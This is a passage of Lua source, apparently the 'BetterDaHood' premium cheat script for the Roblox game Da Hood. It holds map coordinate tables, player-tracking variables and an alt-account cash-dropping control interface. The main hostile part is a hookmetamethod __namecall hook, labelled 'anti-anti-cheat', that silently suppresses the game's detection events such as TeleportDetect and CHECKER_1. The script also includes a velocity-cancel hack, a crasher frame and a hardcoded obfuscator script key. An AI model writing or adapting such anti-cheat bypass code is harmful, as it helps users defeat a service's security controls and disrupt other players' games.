        [34] = Vector3.new(-508.13, 22.66, -293.12),
        [35] = Vector3.new(-512.13, 22.68, -293.12),
        [36] = Vector3.new(-516.13, 22.69, -293.12),
        [37] = Vector3.new(-493.13, 22.62, -289.12),
        [38] = Vector3.new(-493.13, 22.62, -282.12),
        [39] = Vector3.new(-519.38, 23.2, -285.62),
    },
    ["bankroof"] = {
        [1] = Vector3.new(-447.08, 38.5, -269.12),
        [2] = Vector3.new(-460.08, 38.54, -269.12),
        [3] = Vector3.new(-473.08, 38.57, -269.12),
        [4] = Vector3.new(-486.08, 38.61, -269.12),
        [5] = Vector3.new(-499.08, 38.64, -269.12),
        [6] = Vector3.new(-512.08, 38.68, -269.12),
        [7] = Vector3.new(-447.08, 38.5, -276.12),
        [8] = Vector3.new(-460.08, 38.54, -276.12),
        [9] = Vector3.new(-473.08, 38.57, -276.12),
        [10] = Vector3.new(-486.08, 38.61, -276.12),
        [11] = Vector3.new(-499.08, 38.64, -276.12),
        [12] = Vector3.new(-512.08, 38.68, -276.12),
        [13] = Vector3.new(-447.08, 38.5, -283.12),
        [14] = Vector3.new(-460.08, 38.54, -283.12),
        [15] = Vector3.new(-473.08, 38.57, -283.12),
        [16] = Vector3.new(-486.08, 38.61, -283.12),
        [17] = Vector3.new(-499.08, 38.64, -283.12),
        [18] = Vector3.new(-512.08, 38.68, -283.12),
        [19] = Vector3.new(-512.08, 38.68, -290.12),
        [20] = Vector3.new(-499.08, 38.64, -290.12),
        [21] = Vector3.new(-486.08, 38.61, -290.12),
        [22] = Vector3.new(-473.08, 38.57, -290.12),
        [23] = Vector3.new(-460.08, 38.54, -290.12),
        [24] = Vector3.new(-447.08, 38.5, -290.12),
        [25] = Vector3.new(-512.08, 38.68, -297.12),
        [26] = Vector3.new(-499.08, 38.64, -297.12),
        [27] = Vector3.new(-486.08, 38.61, -297.12),
        [28] = Vector3.new(-473.08, 38.57, -297.12),
        [29] = Vector3.new(-460.08, 38.54, -297.12),
        [30] = Vector3.new(-447.08, 38.5, -297.12),
        [31] = Vector3.new(-512.08, 38.68, -304.12),
        [32] = Vector3.new(-499.08, 38.64, -304.12),
        [33] = Vector3.new(-486.08, 38.61, -304.12),
        [34] = Vector3.new(-473.08, 38.57, -304.12),
        [35] = Vector3.new(-460.08, 38.54, -304.12),
        [36] = Vector3.new(-447.08, 38.5, -304.12),
        [37] = Vector3.new(-437.08, 38.47, -277.12),
        [38] = Vector3.new(-437.08, 38.47, -285.12),
        [39] = Vector3.new(-437.08, 38.47, -292.12),
    },
    ["basketball"] = {
        [1] = Vector3.new(-873.01, 22.1, -518),
        [2] = Vector3.new(-896.01, 22.1, -518),
        [3] = Vector3.new(-919.01, 22.1, -518),
        [4] = Vector3.new(-942.01, 22.1, -518),
        [5] = Vector3.new(-965.01, 22.1, -518),
        [6] = Vector3.new(-988.01, 22.1, -518),
        [7] = Vector3.new(-873.01, 22.1, -503),
        [8] = Vector3.new(-896.01, 22.1, -503),
        [9] = Vector3.new(-919.01, 22.1, -503),
        [10] = Vector3.new(-942.01, 22.1, -503),
        [11] = Vector3.new(-965.01, 22.1, -503),
        [12] = Vector3.new(-988.01, 22.1, -503),
        [13] = Vector3.new(-873.01, 22.1, -488),
        [14] = Vector3.new(-896.01, 22.1, -488),
        [15] = Vector3.new(-919.01, 22.1, -488),
        [16] = Vector3.new(-942.01, 22.1, -488),
        [17] = Vector3.new(-965.01, 22.1, -488),
        [18] = Vector3.new(-988.01, 22.1, -488),
        [19] = Vector3.new(-873.01, 22.1, -473),
        [20] = Vector3.new(-896.01, 22.1, -473),
        [21] = Vector3.new(-919.01, 22.1, -473),
        [22] = Vector3.new(-942.01, 22.1, -473),
        [23] = Vector3.new(-965.01, 22.1, -473),
        [24] = Vector3.new(-988.01, 22.1, -473),
        [25] = Vector3.new(-873.01, 22.1, -458),
        [26] = Vector3.new(-896.01, 22.1, -458),
        [27] = Vector3.new(-919.01, 22.1, -458),
        [28] = Vector3.new(-942.01, 22.1, -458),
        [29] = Vector3.new(-965.01, 22.1, -458),
        [30] = Vector3.new(-988.01, 22.1, -458),
        [31] = Vector3.new(-873.01, 22.1, -443),
        [32] = Vector3.new(-896.01, 22.1, -443),
        [33] = Vector3.new(-919.01, 22.1, -443),
        [34] = Vector3.new(-942.01, 22.1, -443),
        [35] = Vector3.new(-965.01, 22.1, -443),
        [36] = Vector3.new(-988.01, 22.1, -443),
        [37] = Vector3.new(-863.55, 19.59, -473.71),
        [38] = Vector3.new(-863.55, 19.59, -490.71),
        [39] = Vector3.new(-866.55, 19.59, -482.21),
    },
}

local ALT_SETUP_LOCATIONS_OG = {
    ["admin"] = Vector3.new(-920, -39, -625),
    ["bank"] = Vector3.new(-389, 22, -373),
    ["club"] = Vector3.new(-291, -6, -405),
    ["train"] = Vector3.new(602, 49, -112),
    ["swamp"] = Vector3.new(-849.75, -27.9, 325.25),
    ["vault"] = Vector3.new(-506.5, 24.5, -285),
    ["bankroof"] = Vector3.new(-437.5, 41.5, -285.1),
    ["basketball"] = Vector3.new(-931.5, 27.6, -482.7),
}

local SETUP_PLATFORMS = {
    ["admin"] = {Size = Vector3.new(167, 1, 177), Position = Vector3.new(-877.755, -42.245, -584)},
    ["bank"] = {Size = Vector3.new(80, 1, 136), Position = Vector3.new(-380.755, 18.255, -285.5)},
    ["club"] = {Size = Vector3.new(167, 1, 177), Position = Vector3.new(-268.755, -9.495, -367.25)},
    ["train"] = {Size = Vector3.new(171, 1, 178), Position = Vector3.new(618.995, 31.255, -83.75)},
    ["swamp"] = {Size = Vector3.new(171, 1, 178), Position = Vector3.new(-902.755, -36.245, 301)},
    ["vault"] = {Size = Vector3.new(36.25, 1, 53.75), Position = Vector3.new(-504.38, 19.755, -284.875)},
    ["bankroof"] = {Size = Vector3.new(100.25, 1, 53.75), Position = Vector3.new(-473.13, 36.005, -284.875)},
    ["basketball"] = {Size = Vector3.new(160.25, 1, 107.5), Position = Vector3.new(-933.38, 18.505, -482.5)},
}

--Vars
getgenv().sendingMessage = false
local friendsCache = {} --[UserId] = true/false/nil
local markedPlayers = {} --[UserId] = true/false/nil
local equippedWeapons = {} --[player] = {"gunname" = true}
local crews = {
    -- [group id (string)] = 
            --.Name - crew name
            --.EmblemUrl (string) = - emblem url
            --.MemberCount (int) - number of members in the server
            --.Loaded = true/nil - whether or not crew data is finished loading
            --.Members = {
                --[playerName] (string) - member list
            --}
        --
}
local isOfficer = false -- is player an officer
local stomping = false -- is this player stomping or not?
local exploiters = {
    ["Swag Mode"] = {},
    ["Enclosed/Encrypt"] = {},
    ["RayX"] = {},
    ["Zapped"] = {},
    ["Pluto"] = {},
    ["BetterDaHood"] = {},
}
local currentHealth = {} -- [player] = currentHealth (int)
local hideCash = false
local joinNotifs = false
local purchasedWeapons = {} -- [character] = {["weaponName"] = true}

--variable settings
local exploiterCommand = ""
local autoUseExploitPremCommand = false
local lowGfx = true -- low gfx
local espMode = "Default"

--Gui
local PLAYER_GUI = PLAYER:WaitForChild("PlayerGui")
local CORE_GUI = game.CoreGui

-- setting up functions for testing when not obfuscated
if not LPH_OBFUSCATED then  -- set these if not obfuscated so your script can run without obfuscation for when you are testing
    LPH_JIT = function(...) return (...) end; -- (mostly normal obfuscation with some performance gains)  - Fast
    LPH_JIT_MAX = function(...) return (...) end; -- (still obfuscated, but more optimized) - Faster
    LPH_NO_VIRTUALIZE = function(...) return (...) end; -- (no virtualization) - Fastest
    script_key = "FSvjTYQSigYyQrFYpsQsQCcAfxzrhPHU";
end

--Edit Da Hood ui
local mainScreenGui = PLAYER_GUI:WaitForChild("MainScreenGui")
local function setupDaHoodUi(mainScreenGui)
    local animationsFrame = mainScreenGui:WaitForChild("AnimationPack"):WaitForChild("ScrollingFrame")
    local leaderboard = mainScreenGui:WaitForChild("Leaderboard")
    local playerScroll = leaderboard:WaitForChild("PlayerScroll")
    local officerScroll = leaderboard:WaitForChild("OfficerScroll")

    --Animations
    local function checkAnimButton(v)
        if v:IsA("TextButton") then
            if v.Text == "Greet" then
                v.BackgroundColor3 = Color3.fromRGB(255, 200, 200)
                v.Text = "Greet [C]"
            elseif v.Text == "Lay" then
                v.BackgroundColor3 = Color3.fromRGB(255, 200, 200)
                v.Text = "Lay [X]"
            end
        end
    end
    for _, v in ipairs(animationsFrame:GetChildren()) do
        checkAnimButton(v)
    end
    animationsFrame.ChildAdded:Connect(function(child)
        checkAnimButton(child)
    end)

    --Anonymous name
    local function checkLabel(instance)
        if instance:IsA("TextLabel") and instance.Text == PLAYER.Name then
            instance.Text = "Me"
        end
    end
    --Player menu
    for _, v in ipairs(playerScroll:GetChildren()) do
        checkLabel(v)
    end
    playerScroll.ChildAdded:Connect(checkLabel)
    --Officer menu
    for _, v in ipairs(officerScroll:GetChildren()) do
        checkLabel(v)
    end
    officerScroll.ChildAdded:Connect(checkLabel)
end
setupDaHoodUi(mainScreenGui)
PLAYER_GUI.ChildAdded:Connect(function(child)
    if child.Name == "MainScreenGui" then
        setupDaHoodUi(child)
    end
end)

--Edit Roblox CoreGui
--[[
local robloxGui = CORE_GUI:WaitForChild("RobloxGui")

local function setupRobloxNameLabel(label)
    local prefix = ""
    if label.Name == "NameLabel" then
        prefix = "@"
    end
    label.Text = prefix.."Me"
end
local function setupRobloxPlayersFrame(playersFrame)
    local playerLabel = playersFrame:WaitForChild("PlayerLabel"..PLAYER.Name)
    local displayNameLabel = playerLabel:WaitForChild("DisplayNameLabel")
    local nameLabel = playerLabel:WaitForChild("NameLabel")

    setupRobloxNameLabel(displayNameLabel)
    setupRobloxNameLabel(nameLabel)

    displayNameLabel:GetPropertyChangedSignal("Text"):Connect(function() setupRobloxNameLabel(displayNameLabel) end)
    nameLabel:GetPropertyChangedSignal("Text"):Connect(function() setupRobloxNameLabel(nameLabel) end)
end
local function setupRobloxGui(robloxGui)
    local pageViewInnerFrame = robloxGui:WaitForChild("SettingsShield"):WaitForChild("SettingsShield"):WaitForChild("MenuContainer"):WaitForChild("PageViewClipper"):WaitForChild("PageView"):WaitForChild("PageViewInnerFrame")

    if pageViewInnerFrame:FindFirstChild("Players") then
        local playersFrame = pageViewInnerFrame.Players
        setupRobloxPlayersFrame(playersFrame)
    else
        pageViewInnerFrame.ChildAdded:Connect(function(pageViewInnerFrameChild)
            if pageViewInnerFrameChild.Name == "Players" then
                setupRobloxPlayersFrame(pageViewInnerFrameChild)
            end
        end)
    end
end
setupRobloxGui(robloxGui)
CORE_GUI.ChildAdded:Connect(function(child)
    if child.Name == "RobloxGui" then
        setupRobloxGui(child)
    end
end)
--]]


if getgenv().antiCheatEnabled ~= true then
    getgenv().antiCheatEnabled = true
    LPH_JIT_MAX(function()
        local events = {"OneMoreTime", "TeleportDetect", "CHECKER_1", "CHECKER_2", "OneMoreTime", "BreathingHAMON", "VirusCough"}
        local hook = nil
        hook = hookmetamethod(game, "__namecall", function(...)
            local Args = {...}
            local self = Args[1]
            local namecall = getnamecallmethod()
            local calledFromExecutor = checkcaller()
            --local callingScript = getcallingscript()

            if namecall == "FireServer" and self == MAIN_EVENT then
                if table.find(events, Args[2]) then -- anti-anti-cheat
                    return nil
                elseif calledFromExecutor == false then
                    if Args[2] == "UpdateMousePos" then
                        --print("UpdateMousePos Blocked")
                        return nil
                    elseif Args[2] == "AnimationPack" then
                        if Args[3] == "Lay [X]" then
                            return hook(self, "AnimationPack", "Lay")
                        elseif Args[3] == "Greet [C]" then
                            return hook(self, "AnimationPack", "Greet")
                        end
                    end
                end
            --[[
            elseif namecall == "Activate" then
                for i,v in pairs(Args) do
                    print(tostring(i).." = "..tostring(v))
                end
                --]]
            end
            return hook(...)
        end)
    end)();
end

--Load/Save data
local bdhSettings = {

}

local bdhSettingsFunctions = {
    
}

local function loadData()
    if isfile("PremSettings.bdh") then
        local contents = HttpService:JSONDecode(readfile("PremSettings.bdh"))
		for propertyName, value in pairs(contents) do
			bdhSettings[propertyName] = value
			bdhSettingsFunctions[propertyName](value)
		end
    end
end

local function saveData()
    if isfile("PremSettings.bdh") then
        delfile("PremSettings.bdh")
	end
    writefile("PremSettings.bdh", HttpService:JSONEncode(bdhSettings))
end

--Functions
local function findPlayer(name)
	if name then
        --If they typed the name exactly, then return that
        if Players:FindFirstChild(name) then return Players[name] end

        --Otherwise search for player name match
		name = name:lower()

		for _, player in ipairs(Players:GetPlayers()) do
			if name == player.Name:lower():sub(1, #name) then
				return player
			end
		end
	end
	return nil
end

local function updateMousePosWithDebounce(position)
    --[[
    for _, v in ipairs(PLAYER.Character:GetChildren()) do
        if v:IsA("Tool") then
            v.Parent = PLAYER.Backpack
        end
    end
    --]]
    
    getgenv().sendingMessage = true
    task.wait()
    MAIN_EVENT:FireServer("UpdateMousePos", position)
    task.wait()
    getgenv().sendingMessage = false
end

local function constructMessage(arguments, startingFromArg)
	if #arguments < startingFromArg then
		return nil
	end
	
	local message = ""
	for i,arg in pairs(arguments) do
		if i >= startingFromArg then
			if i == startingFromArg then
				message = (message..arg)
			else
				message = (message.." "..arg)
			end
		end
	end
	
	return message
end

local function cashToInt(stringValue)
	local noDollarSign = string.sub(stringValue, 2, #stringValue)
	local noComma = string.gsub(noDollarSign, ",", "")
	local toInt = tonumber(noComma)
	
	return toInt
end

local function countFloorCash()
    local totalFloorCashAmount = 0

    for _,v in pairs(workspace.Ignored.Drop:GetChildren()) do
        if v:IsA("Part") then
            local amount = cashToInt(v.BillboardGui.TextLabel.Text)
            --TotalFloorCash
            totalFloorCashAmount += amount
        end
    end

    return totalFloorCashAmount
end

local function isCharacterLoaded(player)
    if player.Character then
        for partName, _ in pairs(REQUIRED_CHAR_PARTS) do
            if not player.Character:FindFirstChild(partName) then
                return false
            end
        end
        return true
    else
        return false
    end
end

local function cancelVelocity(enabled)
    while PLAYER.Character == nil do task.wait() end
    local humanoidRootPart = PLAYER.Character:WaitForChild("HumanoidRootPart")

	if enabled == true then 
		if not humanoidRootPart:FindFirstChild("CustomVelocity") then 
			local vel = Instance.new("BodyVelocity")
			vel.MaxForce = Vector3.new(1, 1, 1) * math.huge
			vel.P = math.huge
			vel.Velocity = Vector3.new(0, 0, 0)
			vel.Name = "CustomVelocity"
			vel.Parent = humanoidRootPart
		end
	else
		if humanoidRootPart:FindFirstChild("CustomVelocity") then 
			humanoidRootPart:FindFirstChild("CustomVelocity"):Destroy()
		end
	end
end

local function itemCount(player, itemName) -- needs LPH_JIT_ULTRA, but idk how to do it
    if isCharacterLoaded(player) then
        local count = 0
        for _, v in ipairs(player.Backpack:GetChildren()) do
            if v.Name == itemName then
                count += 1
            end
        end
        for _, v in ipairs(player.Character:GetChildren()) do
            if v.Name == itemName then
                count += 1
            end
        end
        return count
    else
        return 0
    end
end

local function findNearestPlayer(position, playerToExclude)
	local found
	local last = math.huge
    for _, player in pairs(Players:GetPlayers()) do  -- needs LPH_JIT_ULTRA, but idk how to do it
        if (player.Character and player.Character:FindFirstChild("FULLY_LOADED_CHAR") and player.Character.BodyEffects["K.O"].Value ~= true and not playerToExclude) or player ~= playerToExclude then
            local distance = player:DistanceFromCharacter(position)
            if distance < last then
                found = player
                last = distance
            end
        end
    end
	return found
end

local function getCharacterLocation(humanoidRootPart)
    local regionName = "Not in map"
    for _, regionInfo in ipairs(REGIONS) do -- needs LPH_JIT_ULTRA, but idk how to do it
        local partsFound = workspace:FindPartsInRegion3WithWhiteList(regionInfo.Region, {humanoidRootPart}, math.huge)
        if partsFound[1] then
            regionName = regionInfo.Name
        end
        task.wait()
    end
    return regionName
end

local altsCache = {} -- [userId] == true / nil
local function isAlt(userId)
    if altsCache[userId] == true then
        return true
    elseif altsCache[userId] == false then
        return false
    else
        for i, id in ipairs(getgenv().alts) do
            if userId == id then
                altsCache[userId] = true
                return true
            end
        end
        altsCache[userId] = false
        return false
    end
end

local function getAltNumber(userId)
    for i, id in ipairs(getgenv().alts) do
        if userId == id then
            return i
        end
    end
    return false
end

local function isFriend(player)
	if friendsCache[player] == true then
		return true
	else
		if player:IsFriendsWith(PLAYER.UserId) then
            friendsCache[player] = true
			return true
		else
			return false
		end
	end
end

local function isInCrew(player)
    local dataFolder = player:WaitForChild("DataFolder")
    local informationFolder = dataFolder:WaitForChild("Information")
    local playerCrew = informationFolder:FindFirstChild("Crew")
    if PLAYER_CREW and playerCrew and PLAYER_CREW.Value ~= "" and playerCrew.Value ~= "" and PLAYER_CREW.Value == playerCrew.Value then
        return true
    else
        return false
    end
end

local function roundNumber(num, numDecimalPlaces)
    return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function commaValue(amount)
	local formatted = amount
	local k
	while true do  
		formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
		if (k==0) then
			break
		end
	end
	return formatted
end

local function calculateSecondsToDrop(amount)
    local seconds = math.floor(amount / 666.667 + 0.5)
    return seconds
end

local function Format(Int)
	return string.format("%02i", Int)
end

local function convertToHMS(Seconds)
	local Minutes = (Seconds - Seconds%60)/60
	Seconds = Seconds - Minutes*60
	local Hours = (Minutes - Minutes%60)/60
	Minutes = Minutes - Hours*60
	return Format(Hours)..":"..Format(Minutes)..":"..Format(Seconds)
end

local function toggleLowGfx(toggle)
    task.spawn(function()
        LPH_JIT_MAX(function()
            if toggle == true then
                local count = 0
                for _, v in ipairs(game:GetDescendants()) do
                    if v:IsA("Decal") and v.Name ~= "face" then
                        v:Destroy()
                    end
                    if count < 1200 then
                        count += 1
                    else
                        count = 0
                        task.wait()
                    end
                end
                
                --Lighting.GlobalShadows = false
    
                for part, originalMaterial in pairs(LOW_GFX_PARTS) do
                    part.Material = Enum.Material.SmoothPlastic
                    if count < 1200 then
                        count += 1
                    else
                        count = 0
                        task.wait()
                    end
                end
            else
                --Lighting.GlobalShadows = true
    
                local count = 0
                for part, originalMaterial in pairs(LOW_GFX_PARTS) do
                    part.Material = originalMaterial
                    if count < 1200 then
                        count += 1
                    else
                        count = 0
                        task.wait()
                    end
                end
            end
        end)();
    end)
end

------------------------------------------------------------------------------------- ALT ACCOUNTS -------------------------------------------------------------------------------------
if isAlt(PLAYER.UserId) == true then
    --Setup
    --game.CoreGui:ClearAllChildren()
    --StarterGui:ClearAllChildren()
    --PLAYER_GUI:ClearAllChildren()

    --AltGui (of 'ScreenGui' class)
	local AltGui = Instance.new("ScreenGui")
	AltGui.Name = "AltGui"
	AltGui.IgnoreGuiInset = true
	AltGui.DisplayOrder = 5
	AltGui.Parent = CORE_GUI

	--Create instances
	local Background = Instance.new("Frame")
	local BackgroundGdt = Instance.new("UIGradient")
	local Info = Instance.new("Frame")
	local DisplayName = Instance.new("TextLabel")
	local BetterDaHood = Instance.new("TextLabel")
	local Username = Instance.new("TextLabel")
	local UIListLayout = Instance.new("UIListLayout")
	local StartingCash = Instance.new("TextLabel")
	local CashGainedLost = Instance.new("TextLabel")
	local CurrentCash = Instance.new("TextLabel")
	local TimeRemainingText = Instance.new("TextLabel")
	local TimeRemaining = Instance.new("TextLabel")
	local TotalFloorCash = Instance.new("TextLabel")
	local RecountFloorCash = Instance.new("TextButton")
	local DestroyFloorCash = Instance.new("TextButton")
	local Options = Instance.new("Frame")
	local DropFrame = Instance.new("Frame")
	local DroppingTitle = Instance.new("TextLabel")
	local DropBtn = Instance.new("TextButton")
	local DropTime = Instance.new("TextLabel")
	local CashAuraFrame = Instance.new("Frame")
	local CashAuraTitle = Instance.new("TextLabel")
	local CashAuraBtn = Instance.new("TextButton")
	local FpsLockFrame = Instance.new("Frame")
	local FpsLockTitle = Instance.new("TextLabel")
	local FpsLockBox = Instance.new("TextBox")
	local TakeControlBtn = Instance.new("TextButton")
	local Help = Instance.new("Frame")
	local HelpButton = Instance.new("TextButton")
	local HelpFrame = Instance.new("Frame")
	local HelpText = Instance.new("TextLabel")
	local CrasherFrame = Instance.new("Frame")

	--Set attributes
	LPH_JIT_MAX(function()
		Background.Name = "Background"
		Background.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		Background.BackgroundColor3 = Color3.new(1, 1, 1)
		Background.Size = UDim2.new(1, 0, 1, 0)
		Background.Parent = AltGui
		BackgroundGdt.Name = "BackgroundGdt"
		BackgroundGdt.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.new(0, 0, 0)),ColorSequenceKeypoint.new(1, Color3.new(0.176471, 0.176471, 0.176471)),}
		BackgroundGdt.Rotation = 290
		BackgroundGdt.Parent = Background
		Info.Name = "Info"
		Info.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		Info.AnchorPoint = Vector2.new(0.5, 0.5)
		Info.BackgroundTransparency = 0.949999988079071
		Info.Position = UDim2.new(0.333, 0, 0.4, 0)
		Info.BackgroundColor3 = Color3.new(1, 1, 1)
		Info.Size = UDim2.new(0.375, 0, 0.349, 0)
		Info.Parent = Background
		DisplayName.Name = "DisplayName"
		DisplayName.LayoutOrder = 1
		DisplayName.TextStrokeTransparency = 0.75
		DisplayName.Size = UDim2.new(1, 0, 0.25, 0)
		DisplayName.TextColor3 = Color3.new(1, 1, 1)
		DisplayName.TextXAlignment = Enum.TextXAlignment.Left
		DisplayName.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		DisplayName.Text = "Display Name"
		DisplayName.TextSize = 14
		DisplayName.Font = Enum.Font.SourceSans
		DisplayName.BackgroundTransparency = 1
		DisplayName.Position = UDim2.new(0, 0, 0.05, 0)
		DisplayName.TextScaled = true
		DisplayName.BackgroundColor3 = Color3.new(1, 1, 1)
		DisplayName.Parent = Info
		BetterDaHood.Name = "BetterDaHood"
		BetterDaHood.TextTransparency = 0.75
		BetterDaHood.TextStrokeTransparency = 0.8999999761581421
		BetterDaHood.Size = UDim2.new(1, 0, 0.05, 0)
		BetterDaHood.TextColor3 = Color3.new(1, 1, 1)
		BetterDaHood.TextXAlignment = Enum.TextXAlignment.Left
		BetterDaHood.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		BetterDaHood.Text = "BetterDaHood Premium Alt Control"
		BetterDaHood.TextSize = 14
		BetterDaHood.Font = Enum.Font.GothamBold
		BetterDaHood.BackgroundTransparency = 1
		BetterDaHood.TextScaled = true
		BetterDaHood.BackgroundColor3 = Color3.new(1, 1, 1)
		BetterDaHood.Parent = Info
		Username.Name = "Username"
		Username.LayoutOrder = 2
		Username.TextTransparency = 0.5
		Username.TextStrokeTransparency = 0.75
		Username.Size = UDim2.new(1, 0, 0.075, 0)
		Username.TextColor3 = Color3.new(1, 1, 1)
		Username.RichText = true
		Username.TextXAlignment = Enum.TextXAlignment.Left
		Username.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		Username.Text = "<i>@username</i>"
		Username.TextSize = 14
		Username.Font = Enum.Font.SourceSans
		Username.BackgroundTransparency = 1
		Username.Position = UDim2.new(0, 0, 0.3, 0)
		Username.TextScaled = true
		Username.BackgroundColor3 = Color3.new(1, 1, 1)
		Username.Parent = Info
		UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		UIListLayout.Parent = Info
		StartingCash.Name = "StartingCash"
		StartingCash.LayoutOrder = 3
		StartingCash.TextStrokeTransparency = 0.75
		StartingCash.Size = UDim2.new(1, 0, 0.1, 0)
		StartingCash.TextColor3 = Color3.new(1, 1, 1)
		StartingCash.RichText = true
		StartingCash.TextXAlignment = Enum.TextXAlignment.Left
		StartingCash.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		StartingCash.Text = "Joined with - <font color='rgb(0,255,0)'>$0</font>"
		StartingCash.TextSize = 14
		StartingCash.Font = Enum.Font.SourceSans
		StartingCash.BackgroundTransparency = 1
		StartingCash.Position = UDim2.new(0, 0, 0.3, 0)
		StartingCash.TextScaled = true
		StartingCash.BackgroundColor3 = Color3.new(1, 1, 1)
		StartingCash.Parent = Info
		CashGainedLost.Name = "CashGainedLost"
		CashGainedLost.LayoutOrder = 5
		CashGainedLost.TextStrokeTransparency = 0.75
		CashGainedLost.Size = UDim2.new(1, 0, 0.1, 0)
		CashGainedLost.TextColor3 = Color3.new(1, 1, 1)
		CashGainedLost.RichText = true
		CashGainedLost.TextXAlignment = Enum.TextXAlignment.Left
		CashGainedLost.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		CashGainedLost.Text = "Cash gained/lost since join - <font color='rgb(255,255,255)'>$0</font>"
		CashGainedLost.TextSize = 14
		CashGainedLost.Font = Enum.Font.SourceSans
		CashGainedLost.BackgroundTransparency = 1
		CashGainedLost.Position = UDim2.new(0, 0, 0.3, 0)
		CashGainedLost.TextScaled = true
		CashGainedLost.BackgroundColor3 = Color3.new(1, 1, 1)
		CashGainedLost.Parent = Info
		CurrentCash.Name = "CurrentCash"
		CurrentCash.LayoutOrder = 4
		CurrentCash.TextStrokeTransparency = 0.75
		CurrentCash.Size = UDim2.new(1, 0, 0.1, 0)
		CurrentCash.TextColor3 = Color3.new(1, 1, 1)
		CurrentCash.RichText = true
		CurrentCash.TextXAlignment = Enum.TextXAlignment.Left
		CurrentCash.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		CurrentCash.Text = "Cash - <font color='rgb(0,255,0)'>$0</font>"
		CurrentCash.TextSize = 14
		CurrentCash.Font = Enum.Font.SourceSans
		CurrentCash.BackgroundTransparency = 1
		CurrentCash.Position = UDim2.new(0, 0, 0.3, 0)
		CurrentCash.TextScaled = true
		CurrentCash.BackgroundColor3 = Color3.new(1, 1, 1)
		CurrentCash.Parent = Info
		TimeRemainingText.Name = "TimeRemainingText"
		TimeRemainingText.LayoutOrder = 8
		TimeRemainingText.TextStrokeTransparency = 0.75
		TimeRemainingText.Size = UDim2.new(1, 0, 0.1, 0)
		TimeRemainingText.TextColor3 = Color3.new(1, 1, 1)
		TimeRemainingText.RichText = true
		TimeRemainingText.TextXAlignment = Enum.TextXAlignment.Left
		TimeRemainingText.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		TimeRemainingText.Text = "ETR until empty -"
		TimeRemainingText.TextSize = 14
		TimeRemainingText.Font = Enum.Font.SourceSans
		TimeRemainingText.BackgroundTransparency = 1
		TimeRemainingText.Position = UDim2.new(0, 0, 0.3, 0)
		TimeRemainingText.TextScaled = true
		TimeRemainingText.BackgroundColor3 = Color3.new(1, 1, 1)
		TimeRemainingText.Parent = Info
		TimeRemaining.Name = "TimeRemaining"
		TimeRemaining.LayoutOrder = 9
		TimeRemaining.TextStrokeTransparency = 0.75
		TimeRemaining.Size = UDim2.new(1, 0, 0.15, 0)
		TimeRemaining.TextColor3 = Color3.new(1, 1, 1)
		TimeRemaining.TextXAlignment = Enum.TextXAlignment.Left
		TimeRemaining.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		TimeRemaining.Text = "00:00:00"
		TimeRemaining.TextSize = 14
		TimeRemaining.Font = Enum.Font.SourceSans
		TimeRemaining.BackgroundTransparency = 1
		TimeRemaining.Position = UDim2.new(0, 0, 0.3, 0)
		TimeRemaining.TextScaled = true
		TimeRemaining.BackgroundColor3 = Color3.new(1, 1, 1)
		TimeRemaining.Parent = Info
		TotalFloorCash.Name = "TotalFloorCash"
		TotalFloorCash.LayoutOrder = 7
		TotalFloorCash.TextStrokeTransparency = 0.75
		TotalFloorCash.Size = UDim2.new(1, 0, 0.1, 0)
		TotalFloorCash.TextColor3 = Color3.new(1, 1, 1)
		TotalFloorCash.RichText = true
		TotalFloorCash.TextXAlignment = Enum.TextXAlignment.Left
		TotalFloorCash.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		TotalFloorCash.Text = "Cash on the floor - <font color='rgb(0,255,0)'>$0</font>"
		TotalFloorCash.TextSize = 14
		TotalFloorCash.Font = Enum.Font.SourceSans
		TotalFloorCash.BackgroundTransparency = 1
		TotalFloorCash.Position = UDim2.new(0, 0, 0.3, 0)
		TotalFloorCash.TextScaled = true
		TotalFloorCash.BackgroundColor3 = Color3.new(1, 1, 1)
		TotalFloorCash.Parent = Info
		RecountFloorCash.Name = "RecountFloorCash"
		RecountFloorCash.TextStrokeTransparency = 0
		RecountFloorCash.AnchorPoint = Vector2.new(1, 0)
		RecountFloorCash.Size = UDim2.new(0.1, 0, 1, 0)
		RecountFloorCash.TextColor3 = Color3.new(1, 1, 1)
		RecountFloorCash.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		RecountFloorCash.Text = "Recount"
		RecountFloorCash.TextSize = 14
		RecountFloorCash.Font = Enum.Font.SourceSans
		RecountFloorCash.Position = UDim2.new(1, 0, 0, 0)
		RecountFloorCash.TextScaled = true
		RecountFloorCash.BackgroundColor3 = Color3.new(0, 0.533333, 1)
		RecountFloorCash.Parent = TotalFloorCash
		DestroyFloorCash.Name = "DestroyFloorCash"
		DestroyFloorCash.TextStrokeTransparency = 0
		DestroyFloorCash.AnchorPoint = Vector2.new(1, 0)
		DestroyFloorCash.Size = UDim2.new(0.1, 0, 1, 0)
		DestroyFloorCash.TextColor3 = Color3.new(1, 1, 1)
		DestroyFloorCash.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		DestroyFloorCash.Text = "Destroy cash (client side)"
		DestroyFloorCash.TextSize = 14
		DestroyFloorCash.Font = Enum.Font.SourceSans
		DestroyFloorCash.Position = UDim2.new(0.899, 0, 0, 0)
		DestroyFloorCash.TextScaled = true
		DestroyFloorCash.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
		DestroyFloorCash.Parent = TotalFloorCash
		Options.Name = "Options"
		Options.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		Options.AnchorPoint = Vector2.new(0.5, 0.5)
		Options.BackgroundTransparency = 0.949999988079071
		Options.Position = UDim2.new(0.5, 0, 0.75, 0)
		Options.BackgroundColor3 = Color3.new(1, 1, 1)
